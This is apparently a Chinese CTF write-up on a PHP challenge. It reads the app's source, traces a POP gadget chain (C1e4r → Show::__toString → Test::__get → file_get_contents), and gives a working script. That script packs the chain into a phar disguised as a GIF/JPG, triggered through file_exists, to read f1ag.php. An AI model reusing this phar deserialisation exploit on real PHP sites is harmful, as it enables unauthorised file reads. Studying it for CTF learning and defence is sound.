---
title: POP链phar反序列化
published: 2021-11-07 19:28
category: Web
draft: false
tags: [PHP, 反序列化, Phar, POP链]
---

# POP链phar反序列化

首页。啥也没有。就一个IP。还有个查看文件和上传文件。
查看文件处。有个file参数。可能存在任意文件读取。

![](/images/posts/pop-chain-phar-deserialization/1.png)

文件上传处。只允许图片类型。并且不返回路径

![](/images/posts/pop-chain-phar-deserialization/2.png)

右键源代码有提示
`<!--flag is in f1ag.php-->`
先从文件读取处下手。
filter伪协议读取。。文件不存在？？？？

![](/images/posts/pop-chain-phar-deserialization/3.png)

直接输入index.php。返回了源码

![](/images/posts/pop-chain-phar-deserialization/4.png)

根据线索。一个个都读出来
**index.php**

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'base.php';
?> 
```

**base.php**

```php
<?php 
    session_start(); 
?> 
<!DOCTYPE html> 
<html> 
<head> 
    <meta charset="utf-8"> 
    <title>web3</title> 
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"> 
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script> 
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script> 
</head> 
<body> 
    <nav class="navbar navbar-default" role="navigation"> 
        <div class="container-fluid"> 
        <div class="navbar-header"> 
            <a class="navbar-brand" href="index.php">首页</a> 
        </div> 
            <ul class="nav navbar-nav navbra-toggle"> 
                <li class="active"><a href="file.php?file=">查看文件</a></li> 
                <li><a href="upload_file.php">上传文件</a></li> 
            </ul> 
            <ul class="nav navbar-nav navbar-right"> 
                <li><a href="index.php"><span class="glyphicon glyphicon-user"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li> 
            </ul> 
        </div> 
    </nav> 
</body> 
</html> 
<!--flag is in f1ag.php-->
```

**file.php**

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```

**upload_file.php**

```php
<?php 
include 'function.php'; 
upload_file(); 
?> 
<html> 
<head> 
<meta charest="utf-8"> 
<title>文件上传</title> 
</head> 
<body> 
<div align = "center"> 
        <h1>前端写得很low,请各位师傅见谅!</h1> 
</div> 
<style> 
    p{ margin:0 auto} 
</style> 
<div> 
<form action="upload_file.php" method="post" enctype="multipart/form-data"> 
    <label for="file">文件名:</label> 
    <input type="file" name="file" id="file"><br> 
    <input type="submit" name="submit" value="提交"> 
</div> 

</script> 
</body> 
</html>
```

**function.php**

```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 
```

**class.php**

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?>
```

首先从index.php分析

```php
include了一个base.php
base.php输出了一个REMOTE_ADDR。我的IP地址
也就是我首页的那个IP
```

![](/images/posts/pop-chain-phar-deserialization/5.png)

接着分析file.php

```php
包含了function.php和class.php
设置了open_basedir。
用file_exists判断file参数的文件是否存在。怪不得我用base64读不了。伪协议不能用在这个函数
若文件存在。将要读取的文件赋值给Show类的$source。调用_show()
我们在class.php找到了这个函数。
public function _show(){
    if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
        die('hacker!');
    } else{
            highlight_file($this->source);
    }      
}
```

`将我们传入的文件名。经过正则过滤。如果包含了特殊字符就die退出。否则就读取源码`
`总结读取流程：文件名->file_exists_>正则过滤>读取`
接下来看文件上传部分

```php
include function.php
upload_file()
```

![](/images/posts/pop-chain-phar-deserialization/6.png)

```php
调用upload_file函数。
首先得经过upload_file_check()函数。
这个函数是判断文件后缀名的。必须是gif/jpeg/jpg/png
通过匹配后。进入upload_file_do()
这里就是上传文件了。文件名=md5(文件名+IP地址)
```

我们上传个1.jpg。经过MD5+首页的IP地址运算得到结果。然后访问
![](/images/posts/pop-chain-phar-deserialization/7.png)

当看到file.php判断文件是否存在用的是file_exists()函数。又看到class.php中。有三个类。并且两个类没被用到。不多说了。十有八九又是phar反序列化

直接去构造POP链

Show类中。自带文件读取功能。但是文件名不能带有flag。就算我们能通过phar反序列化后。还是绕不开这层正则匹配。这里就放弃了

![](/images/posts/pop-chain-phar-deserialization/8.png)

```php
再看看其他类。发现Test类中。有一个魔法函数__get。当调用不存在的函数或属性时。就会自动调用__get函数。get函数又会调用__get。get又调用file_get读取文件。
大致流程就是：不存在的函数->__get魔法函数->get函数->file_get函数读取
那么我们就要找一个不存在的调用。
可以看到$this->str['str']->source。如果我将str['str']变成Test类。调用source函数。由于Test类没有source函数。就会触发魔法函数。调用__get。也就完成了上面的步骤
```

![](/images/posts/pop-chain-phar-deserialization/9.png)

问题又来了。这个利用点再__toString魔法方法中。此魔术方法是输出时。比如echo什么的才会触发。还得继续找POP链

这不就找到了

![](/images/posts/pop-chain-phar-deserialization/10.png)

理一下思路。

```php
通过Cle4r。将str赋值为Show类。
this->test=$this->Show类
echo $this->test;
触发Show类中的__tostring魔术方法。进入Show类。执行
$content=$this->str['str']->source;
那么我们将str['str']赋值为Test类。使其调用source。但是不存在。
接下来就进入了Test类。执行
__get($key)。这个$key。其实就是source。
get($key)
$value=this->params['source'];
file_get_contents($value);
由于Test类在构造函数中。定义了params是个数组。那么我们就定义params=array('source'=>'/var/www/html/fl1g.php');
```

至此。整个POP链构造完成
下面开始构造EXP

```php
class C1e4r{
	public $test;
	public $str;
}
class Show{
	public $source;
	public $str;
}
class Test{
	public $file;
	public $params;	
}
$c=new Test();
$c->params=array('source'=>'var/www/html/f1ag.php');
$b=new Show();
$b->str['str']=$c;
$a=new C1e4r();
$a->str=$b;
echo serialize($a);
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering(); 
$phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); 
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

将phar.phar修改为6.jpg上传。

phar触发得到flag

![](/images/posts/pop-chain-phar-deserialization/11.png)